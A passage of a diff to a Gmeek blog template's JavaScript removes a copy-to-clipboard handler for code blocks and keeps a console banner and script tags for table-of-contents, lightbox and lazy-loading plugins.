0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z'};
 var utterancesLoad=0;
 
 console.log("\n %c Gmeek main https://github.com/Meekdai/Gmeek \n","padding:5px 0;background:#02d81d;color:#fff");
@@ -1296,70 +1287,7 @@ function iFrameLoading(){
     }
 }
 
-document.addEventListener('DOMContentLoaded', () => {
-    const createClipboardHTML = (codeContent, additionalClasses = '') => `
-        <pre class="notranslate"><code class="notranslate">${codeContent}</code></pre>
-        <div class="clipboard-container position-absolute right-0 top-0 ${additionalClasses}">
-            <clipboard-copy class="ClipboardButton btn m-2 p-0" role="button" style="display: inherit;">
-                <svg height="16" width="16" class="octicon octicon-copy m-2"><path d="${IconList["copy"]}"></path></svg>
-                <svg height="16" width="16" class="octicon octicon-check color-fg-success m-2 d-none"><path d="${IconList["check"]}"></path></svg>
-            </clipboard-copy>
-            <div class="copy-feedback">Copied!</div>
-        </div>
-    `;
 
-    const handleCodeElements = (selector = '') => {
-        document.querySelectorAll(selector).forEach(codeElement => {
-            const codeContent = codeElement.innerHTML;
-            const newStructure = document.createElement('div');
-            newStructure.className = 'snippet-clipboard-content position-relative overflow-auto';
-            newStructure.innerHTML = createClipboardHTML(codeContent);
-
-            const parentElement = codeElement.parentElement;
-            if (selector.includes('highlight')) {
-                parentElement.insertBefore(newStructure, codeElement.nextSibling);
-                parentElement.removeChild(codeElement);
-            } else {
-                parentElement.parentElement.replaceChild(newStructure, parentElement);
-            }
-        });
-    };
-
-    handleCodeElements('pre.notranslate > code.notranslate');
-    handleCodeElements('div.highlight > pre.notranslate');
-
-    let currentFeedback = null;
-    document.querySelectorAll('clipboard-copy').forEach(copyButton => {
-        copyButton.addEventListener('click', () => {
-            const codeContent = copyButton.closest('.snippet-clipboard-content').innerText;
-            const tempTextArea = document.createElement('textarea');
-            tempTextArea.value = codeContent;
-            document.body.appendChild(tempTextArea);
-            tempTextArea.select();
-            document.execCommand('copy');
-            document.body.removeChild(tempTextArea);
-
-            const copyIcon = copyButton.querySelector('.octicon-copy');
-            const checkIcon = copyButton.querySelector('.octicon-check');
-            const copyFeedback = copyButton.nextElementSibling;
-
-            if (currentFeedback && currentFeedback !== copyFeedback) {currentFeedback.style.display = 'none';}
-            currentFeedback = copyFeedback;
-
-            copyIcon.classList.add('d-none');
-            checkIcon.classList.remove('d-none');
-            copyFeedback.style.display = 'block';
-            copyButton.style.borderColor = 'var(--color-success-fg)';
-
-            setTimeout(() => {
-                copyIcon.classList.remove('d-none');
-                checkIcon.classList.add('d-none');
-                copyFeedback.style.display = 'none';
-                copyButton.style.borderColor = '';
-            }, 2000);
-        });
-    });
-});
 
 </script>
 </script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>
